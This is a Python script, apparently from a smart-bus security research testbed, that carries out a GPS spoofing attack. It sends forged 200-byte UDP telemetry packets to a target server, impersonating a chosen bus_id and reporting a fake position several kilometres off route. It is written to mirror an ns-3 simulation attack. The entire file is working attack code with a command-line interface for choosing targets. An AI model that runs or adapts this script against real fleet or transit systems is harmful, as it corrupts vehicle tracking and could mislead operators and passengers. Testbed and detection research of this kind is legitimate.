#!/usr/bin/env python3
"""
Al-Ahsa Smart Bus — GPS spoofing attack script.

Sends forged GPS telemetry packets that impersonate a given bus_id but
report a fake position far from the real route.  Replicates the ns-3
GpsSpoofAttackApp (smart-bus.cc lines 693-818).

Packet wire format (little-endian, 200 bytes total):
    [0..3]   uint32  magic   = 0x47505331 ("GPS1")
    [4..7]   uint32  bus_id
    [8..15]  double  pos_x
    [16..23] double  pos_y
    [24..199] zeros  (padding)

Default fake position: (14000, 1000) — approximately 8 km from route 0,
matching the ns-3 Vector fakePos(14000, 1000, 0) at line 1701.

Default count: 30 packets at 1 pkt/s, matching ns-3 numPackets=30 and
interval=1.0 (lines 734, 1705).

Usage:
    python gps_spoof.py --target 192.168.1.100 --bus-id 0
    python gps_spoof.py --target 192.168.1.100 --bus-id 0 --fake-x 14000 --fake-y 1000 --count 30
"""

import argparse
import logging
import signal
import socket
import struct
import sys
import time

logger = logging.getLogger(__name__)

# Constants matching ns-3
GPS_PAYLOAD_MAGIC = 0x47505331   # "GPS1"
PACKET_SIZE = 200                # smart-bus.cc line 471/785
SEND_INTERVAL = 1.0             # 1 packet per second
DEFAULT_PORT = 5000              # TELEMETRY_PORT

# Header format: magic(4) + bus_id(4) + pos_x(8) + pos_y(8) = 24 bytes
_HEADER_FMT = "<IIdd"
_HEADER_SIZE = struct.calcsize(_HEADER_FMT)  # 24


def build_gps_packet(bus_id: int, pos_x: float, pos_y: float) -> bytes:
    """Build a 200-byte GPS telemetry packet with spoofed coordinates."""
    header = struct.pack(_HEADER_FMT, GPS_PAYLOAD_MAGIC, bus_id, pos_x, pos_y)
    padding = b"\x00" * (PACKET_SIZE - _HEADER_SIZE)
    return header + padding


def run_spoof(target: str, port: int, bus_id: int,
              fake_x: float, fake_y: float, count: int) -> None:
    """Send *count* spoofed GPS packets to the target."""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Graceful shutdown
    running = True

    def _signal_handler(signum, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    logger.info(
        "GPS spoof starting -> %s:%d  bus_id=%d  fake=(%g, %g)  count=%d",
        target, port, bus_id, fake_x, fake_y, count,
    )

    total_sent = 0

    try:
        for seq in range(count):
            if not running:
                break

            packet = build_gps_packet(bus_id, fake_x, fake_y)

            try:
                sock.sendto(packet, (target, port))
                total_sent += 1
                print(
                    f"[{seq + 1:3d}/{count}]  bus_id={bus_id}  "
                    f"pos=({fake_x:g}, {fake_y:g})  "
                    f"-> {target}:{port}"
                )
            except OSError as exc:
                logger.warning("Send error on pkt %d: %s", seq + 1, exc)

            # Wait 1 second between packets (matching ns-3 interval=1.0)
            if seq < count - 1 and running:
                deadline = time.monotonic() + SEND_INTERVAL
                while time.monotonic() < deadline and running:
                    remaining = deadline - time.monotonic()
                    if remaining > 0.05:
                        time.sleep(0.05)

    finally:
        sock.close()
        print(
            f"\nGPS spoof finished.  Sent {total_sent}/{count} packets "
            f"for bus_id={bus_id} to {target}:{port}"
        )


def main():
    parser = argparse.ArgumentParser(
        description="Al-Ahsa Smart Bus — GPS spoofing attack"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target IP address (server receiving GPS telemetry)"
    )
    parser.add_argument(
        "--bus-id", type=int, default=0,
        help="Bus ID to impersonate (default: 0)"
    )
    parser.add_argument(
        "--fake-x", type=float, default=14000.0,
        help="Fake X coordinate in meters (default: 14000, ~8km from route 0)"
    )
    parser.add_argument(
        "--fake-y", type=float, default=1000.0,
        help="Fake Y coordinate in meters (default: 1000)"
    )
    parser.add_argument(
        "--count", type=int, default=30,
        help="Number of spoofed packets to send (default: 30, matching ns-3)"
    )
    parser.add_argument(
        "--port", type=int, default=DEFAULT_PORT,
        help="Target UDP port (default: 5000 = TELEMETRY_PORT)"
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Enable debug logging"
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    run_spoof(
        args.target, args.port, args.bus_id,
        args.fake_x, args.fake_y, args.count,
    )


if __name__ == "__main__":
    main()
